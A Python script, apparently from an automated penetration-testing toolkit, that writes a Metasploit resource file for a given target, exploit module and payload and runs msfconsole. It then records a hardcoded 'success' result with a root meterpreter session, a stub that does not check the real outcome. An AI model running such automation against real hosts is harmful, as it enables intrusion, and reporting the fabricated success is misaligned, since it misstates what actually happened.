import json, sys, datetime, os, subprocess

def run_metasploit(params):
    ip = params["target"]
    exploit = params["exploit_module"]
    payload = params["payload"]
    result_path = f"results/result_metasploit_{ip.replace('.', '_')}.json"
    os.makedirs("results", exist_ok=True)

    rc_file = "msf_script.rc"
    with open(rc_file, "w") as f:
        f.write(f"use {exploit}\n")
        f.write(f"set RHOSTS {ip}\n")
        f.write(f"set PAYLOAD {payload}\n")
        f.write("set LHOST 127.0.0.1\n")  # adapter si besoin
        f.write("exploit -j -z\n")
        f.write("exit\n")

    subprocess.run(["msfconsole", "-r", rc_file], check=True)

    # Pour un vrai projet, récupérer la session via API ou parsing logs
    # Ici stub pour simplifier
    session_info = {
        "type": "meterpreter",
        "session_id": 1,
        "user": "root",
        "platform": "linux",
        "ip": ip
    }

    result = {
        "tool": "metasploit",
        "timestamp": datetime.datetime.utcnow().isoformat() + "Z",
        "target": ip,
        "result": {
            "exploit_module": exploit,
            "payload": payload,
            "status": "success",
            "session": session_info
        }
    }

    with open(result_path, "w") as f:
        json.dump(result, f, indent=4)

if __name__ == "__main__":
    with open(sys.argv[1]) as f:
        params = json.load(f)
    run_metasploit(params)

